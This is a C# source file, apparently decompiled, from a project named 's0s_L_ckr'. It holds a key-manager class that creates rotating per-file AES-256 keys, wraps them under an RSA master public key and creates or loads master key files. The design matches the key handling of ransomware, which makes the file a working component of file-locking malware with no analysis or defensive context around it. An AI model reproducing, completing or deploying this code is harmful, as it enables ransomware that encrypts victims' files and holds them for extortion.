using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;

namespace s0s_L_ckr;

public sealed class CriptoKeyMgr
{
	private static SecureString PUBL_KEY = null;

	private static SecureString PRIV_KEY = null;

	public static byte[] CURR_FIL_ENC_KEY = null;

	public static byte[] CURR_FIL_ENC_IV = null;

	public static Aes CURR_AES_ENC_ENG = null;

	private CriptoKeyMgr()
	{
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public static void GenAesKeyPair(ref byte[] key, ref byte[] iv)
	{
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Mode = CipherMode.CBC;
		aes.Padding = PaddingMode.PKCS7;
		aes.GenerateIV();
		aes.GenerateKey();
		byte[] array = aes.Key;
		byte[] array2 = aes.IV;
		key = new byte[array.Length];
		iv = new byte[array2.Length];
		Array.Copy(array, key, array.Length);
		Array.Copy(array2, iv, array2.Length);
		Comn.ClearArray(ref array);
		Comn.ClearArray(ref array2);
		aes.Clear();
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public static void ProtAesKey(ref Aes currAesEng, ref byte[] currKey, ref byte[] currIv, ref SecureString publKey)
	{
		if (currAesEng != null)
		{
			((IDisposable)currAesEng).Dispose();
		}
		currAesEng = new AesManaged();
		currAesEng.KeySize = 256;
		currAesEng.Mode = CipherMode.CBC;
		currAesEng.Padding = PaddingMode.PKCS7;
		currAesEng.Key = currKey;
		currAesEng.IV = currIv;
		string dest = "";
		Comn.OpenSecStr(ref dest, ref publKey);
		using (RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider())
		{
			rSACryptoServiceProvider.FromXmlString(dest);
			currKey = rSACryptoServiceProvider.Encrypt(currKey, fOAEP: true);
			currIv = rSACryptoServiceProvider.Encrypt(currIv, fOAEP: true);
		}
		Comn.ClearString(ref dest);
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public static void UnprotectAesKey(ref byte[] protKey, ref byte[] key, ref byte[] protIv, ref byte[] iv)
	{
		string dest = "";
		Comn.OpenSecStr(ref dest, ref PRIV_KEY);
		using (RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider())
		{
			rSACryptoServiceProvider.FromXmlString(dest);
			key = rSACryptoServiceProvider.Decrypt(protKey, fOAEP: true);
			iv = rSACryptoServiceProvider.Decrypt(protIv, fOAEP: true);
		}
		Comn.ClearString(ref dest);
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public unsafe static void GenRsaKeyPai(ref SecureString privAndPubKey, ref SecureString pubKey)
	{
		using RSA rSA = new RSACryptoServiceProvider();
		rSA.KeySize = 2048;
		string strg = rSA.ToXmlString(includePrivateParameters: true);
		try
		{
			fixed (char* value = strg)
			{
				privAndPubKey = new SecureString(value, strg.Length);
				privAndPubKey.MakeReadOnly();
			}
		}
		finally
		{
		}
		Comn.ClearString(ref strg);
		string strg2 = rSA.ToXmlString(includePrivateParameters: false);
		try
		{
			fixed (char* value2 = strg2)
			{
				pubKey = new SecureString(value2, strg2.Length);
				pubKey.MakeReadOnly();
			}
		}
		finally
		{
		}
		Comn.ClearString(ref strg2);
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public static void RotAesKey()
	{
		if (CURR_FIL_ENC_KEY == null)
		{
			GenAesKeyPair(ref CURR_FIL_ENC_KEY, ref CURR_FIL_ENC_IV);
			ProtAesKey(ref CURR_AES_ENC_ENG, ref CURR_FIL_ENC_KEY, ref CURR_FIL_ENC_IV, ref PUBL_KEY);
		}
		else if (Comn.rand.Next(0, 100) == 99)
		{
			GenAesKeyPair(ref CURR_FIL_ENC_KEY, ref CURR_FIL_ENC_IV);
			ProtAesKey(ref CURR_AES_ENC_ENG, ref CURR_FIL_ENC_KEY, ref CURR_FIL_ENC_IV, ref PUBL_KEY);
		}
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public unsafe static void EnsrLocPubKey()
	{
		if (File.Exists("master_public_key.info"))
		{
			using (FileStream fileStream = File.OpenRead("master_public_key.info"))
			{
				byte[] array = new byte[fileStream.Length];
				fileStream.Read(array, 0, array.Length);
				string strg = Encoding.ASCII.GetString(array);
				Comn.ClearArray(ref array);
				try
				{
					fixed (char* value = strg)
					{
						PUBL_KEY = new SecureString(value, strg.Length);
						PUBL_KEY.MakeReadOnly();
					}
				}
				finally
				{
				}
				Comn.ClearString(ref strg);
			}
			using FileStream fileStream2 = File.OpenRead("master_private_key.info");
			byte[] array2 = new byte[fileStream2.Length];
			fileStream2.Read(array2, 0, array2.Length);
			string strg2 = Encoding.ASCII.GetString(array2);
			Comn.ClearArray(ref array2);
			try
			{
				fixed (char* value2 = strg2)
				{
					PRIV_KEY = new SecureString(value2, strg2.Length);
					PRIV_KEY.MakeReadOnly();
				}
			}
			finally
			{
			}
			Comn.ClearString(ref strg2);
			return;
		}
		GenRsaKeyPai(ref PRIV_KEY, ref PUBL_KEY);
		using FileStream fileStream3 = new FileStream("master_public_key.info", FileMode.Create);
		string dest = "";
		Comn.OpenSecStr(ref dest, ref PUBL_KEY);
		byte[] array3 = Encoding.ASCII.GetBytes(dest);
		Comn.ClearString(ref dest);
		fileStream3.Write(array3, 0, array3.Length);
		Comn.ClearArray(ref array3);
	}
}
